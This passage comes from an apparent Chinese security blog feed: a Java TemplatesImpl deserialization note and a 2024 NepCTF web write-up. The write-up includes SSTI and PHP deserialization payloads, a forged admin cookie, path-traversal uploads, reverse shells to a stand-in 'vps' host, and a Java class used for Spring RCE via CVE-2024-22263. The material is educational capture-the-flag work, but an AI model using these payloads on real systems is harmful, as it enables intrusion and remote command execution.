class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateImplTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;      <br>        <span class="hljs-comment">//不写文件直接给变量</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        CtClass cc=pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        CtConstructor ctConstructor=cc.makeClassInitializer();<br>        ctConstructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes=cc.toBytecode();<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Method defineTransletClasses=templates.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getTransletInstance&quot;</span>);<br>        defineTransletClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        defineTransletClasses.invoke(templates);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String field,Object arg )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Field f= obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj,arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="链子2"><a class="markdownIt-Anchor" href="#链子2"></a> 链子2</h3><p>链子1延长而已</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:newTransformer-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineTransletClasses-&gt;TransletClassLoader</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineClass</span><br></code></pre></td></tr></table></figure><h3 id="链子3"><a class="markdownIt-Anchor" href="#链子3"></a> 链子3</h3><p>链子2再延长而已</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getOutputProperties-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:newTransformer-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineTransletClasses-&gt;TransletClassLoader</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineClass</span><br></code></pre></td></tr></table></figure><p>不过getOutputProperties是public可以直接调用，不需要反射。</p><h3 id="tempatesimpl触发任意getter"><a class="markdownIt-Anchor" href="#tempatesimpl触发任意getter"></a> TempatesImpl触发任意getter</h3><p><strong>这里的getter是指以get开头的方法</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">ObjectMapper</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:writeValueAsString-&gt;ObjectMapper</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_writeValueAndClose-&gt;DefaultSerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeValue-&gt;DefaultSerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_serialize-&gt;BeanSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serialize-&gt;BeanSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeFields-&gt;BeanPropertyWriter</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeAsField</span><br></code></pre></td></tr></table></figure><p>BeanSerializer::serializeFields会遍历所有getter，每个get都会调用<code>BeanPropertyWriter::serializeAsField</code>通过<code> this._accessorMethod.invoke(bean, (Object[])null);</code>调用getter。</p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><em><a href="https://www.cnblogs.com/seizer/p/17064102.html">TemplatesImpl利用链分析 - seizer-zyx - 博客园 (cnblogs.com)</a></em></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024NepCTF</title>
    <link href="/2024/08/26/2024NepCTF/"/>
    <url>/2024/08/26/2024NepCTF/</url>
    
    <content type="html"><![CDATA[<p>没错，冲着贴纸来的！</p><img src="/2024/08/26/2024NepCTF/1.jpg" class=""><h1 id="nepmagic-checkin"><a class="markdownIt-Anchor" href="#nepmagic-checkin"></a> NepMagic —— CheckIn</h1><p>集齐所有碎片通过就o了</p><p>NepCTF{50c505f4-2700-11ef-ad49-00155d5e2505}</p><h1 id="nepdouble"><a class="markdownIt-Anchor" href="#nepdouble"></a> NepDouble</h1><img src="/2024/08/26/2024NepCTF/2.jpg" class=""><p>这里明显存在SSTI，而且文件名可控</p><p>创建一个名为</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__init__.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read().py</span><br></code></pre></td></tr></table></figure><p>的文件，然后压缩成zip上传</p><img src="/2024/08/26/2024NepCTF/3.jpg" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;https://neptune-55198.nepctf.lemonprefect.cn/&quot;</span><br>file=&#123;<span class="hljs-string">&quot;tp_file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:/CTFtmp/test.zip&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)&#125;<br>r=requests.post(url=url,files=file)<br><span class="hljs-built_in">print</span>(r.text)<br><br><br><span class="hljs-comment">#&lt;a href=&quot;/cat?file=f35a84497a3683d7a0f11aa112ed07fc/NepCTF&#123;89cf3517-065a-45f3-b9e9-3b8e2721d22b&#125;.py&quot;&gt;flag&#x27;).read()&#125;&#125;.py&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><h1 id="蹦蹦炸弹boom_it"><a class="markdownIt-Anchor" href="#蹦蹦炸弹boom_it"></a> 蹦蹦炸弹（boom_it）</h1><img src="/2024/08/26/2024NepCTF/4.jpg" class=""><p>secret_key已经知道，可以伪造admin</p><img src="/2024/08/26/2024NepCTF/5.jpg" class=""><p>改一下然后本地启动，得到admin的cookie</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">session</span><span class="hljs-operator">=</span>eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br></code></pre></td></tr></table></figure><p>用这个cookie访问admin/dashboard，上传文件lock.txt</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/admin/</span>dashboard HTTP/<span class="hljs-number">1.1</span><br>Host: neptune-<span class="hljs-number">54601</span>.nepctf.lemonprefect.cn<br>Sec-Ch-Ua: <span class="hljs-string">&quot;-Not.A/Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;102&quot;</span><br>Sec-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br>Sec-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/102.0.5005.63 Safari/</span><span class="hljs-number">537.36</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>Sec-Fetch-Site: none<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?<span class="hljs-number">1</span><br>Sec-Fetch-Dest: document<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Connection: close<br>Cookie:session=eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD61WFa2qL1y9KPPS<br>Content-Length: <span class="hljs-number">198</span><br><br>------WebKitFormBoundaryD61WFa2qL1y9KPPS<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>;filename=<span class="hljs-string">&quot;../../lock.txt&quot;</span><br>Content-Type:multipart/form-data<br><br><span class="hljs-number">111</span><br>------WebKitFormBoundaryD61WFa2qL1y9KPPS--<br><br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin/dashboard?cmd=bash+-c+&#x27;bash+-i+&gt;%<span class="hljs-number">26</span>+/dev/tcp/vps/port+&lt;%<span class="hljs-number">261</span>&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: neptune-<span class="hljs-number">54601</span>.nepctf.lemonprefect.cn<br><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot;-Not.A/Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;102&quot;</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">102</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5005</span>.<span class="hljs-number">63</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>:session=eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br><span class="hljs-attribute">Connection</span>: close<br><br><br></code></pre></td></tr></table></figure><p>有个pwn文件，传fascan上去扫一下开放的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 11451 &lt;fscan<br><br>nc vps 11451 &gt;fscan<br><span class="hljs-built_in">chmod</span> +x fscan<br>./fscan -h 127.0.0.1<br></code></pre></td></tr></table></figure><p>可以发现内网的8888端口是开放的</p><p>nc一下发现是start.sh在运行，而且start.sh是root用户的，那起的服务也就具有root权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;chmod 0777 /home/ctfuser/flag*&quot;</span> &gt;&gt;start.sh<br><span class="hljs-attribute">nc</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>flag就有权限了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/home/</span>ctfuser/flag*<br></code></pre></td></tr></table></figure><p>NepCTF{197b7e20-0bb8-47a1-a431-82a2c18ed9ae}</p><h1 id="php_master"><a class="markdownIt-Anchor" href="#php_master"></a> PHP_MASTER!!</h1><p>要构造的调用链C::__destruct–&gt;B::__tostring–&gt;phpinfo</p><p>要执行($this-&gt;b) ()就要绕过过滤</p><p>由于mb_substr(data,start,end)，当end为负数时是从后往前数，所以构造<code>nep=1&amp;nep1=]              [NepCTF]</code>进行绕过</p><p>因为使用<code>$data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);</code>进行替换，所以是反序列化变长逃逸，由于只能控制C-&gt;s;</p><p>因为echo是str，所以需要使C-&gt;str是B，所以构造<code>s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;</code></p><p>把这个放到C,最后要使得序列化C之后要得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:?:<span class="hljs-string">&quot;填充\0&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;&#125;&#125;;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>?和\0的个数是我们要计算的，而通过c传递的值为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">填充\<span class="hljs-number">0</span><span class="hljs-string">&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">b&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;;&#125;</span><br></code></pre></td></tr></table></figure><p>如果不填充？的值就是<code>&quot;;s:3:&quot;str&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度</p><p>每填充一个\0经过替换后就会逃逸右边一个符号，总共需要逃逸<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度为49</p><p>所以？的值就是输入c的长度，即<code>49个\0&quot;;s:3:&quot;str&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度，为108</p><p>通过url编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%4</span>f<span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%42</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%7</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%62</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%37</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d&amp;nep<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;nep<span class="hljs-number">1</span><span class="hljs-operator">=</span>]              [NepCTF]<br></code></pre></td></tr></table></figure><p>序列化后变成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:<span class="hljs-number">108</span>:<span class="hljs-string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;&#125;&#125;;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>nepctf{fc8b21346275}</p><h1 id="always-rce-first"><a class="markdownIt-Anchor" href="#always-rce-first"></a> Always RCE First</h1><p>访问<a href="https://neptune-46711.nepctf.lemonprefect.cn/api/about">https://neptune-46711.nepctf.lemonprefect.cn/api/about</a></p><img src="/2024/08/26/2024NepCTF/6.jpg" class=""><p>用的Spring Cloud Skipper Server版本是2.11.2，google搜一下发现这个版本存在CVE可以在任意位置写文件</p><p><a href="https://github.com/securelayer7/CVE-2024-22263_Scanner">https://github.com/securelayer7/CVE-2024-22263_Scanner</a></p><p><a href="https://yyjccc.github.io/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/">https://yyjccc.github.io/2024/07/12/springcloud-dataflow任意文件写入（CVE-2024-22263）/</a></p><img src="/2024/08/26/2024NepCTF/7.jpg" class=""><p>Dockerfile 里面用的是jdk8</p><p>搜一下发现spring-boot jdk8存在从文件上传到RCE的利用方法</p><p><a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p><p><a href="https://forum.butian.net/share/1623">https://forum.butian.net/share/1623</a></p><p>把里面的IBM33722改成反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> sun.nio.cs.ext;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IBM33722</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IBM33722</span><span class="hljs-params">()</span> &#123;<br>        fun();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;String, String&gt; <span class="hljs-title function_">fun</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>        String[] var0;<br>        <span class="hljs-keyword">if</span> (var2.startsWith(<span class="hljs-string">&quot;Mac OS&quot;</span>)) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var2.startsWith(<span class="hljs-string">&quot;Windows&quot;</span>)) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp;/dev/tcp/vps/9090 0&gt;&amp;1&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp;/dev/tcp/vps/9090 0&gt;&amp;1&quot;</span>&#125;;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(var0);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>            var4.printStackTrace();<br>        &#125;<br><br>        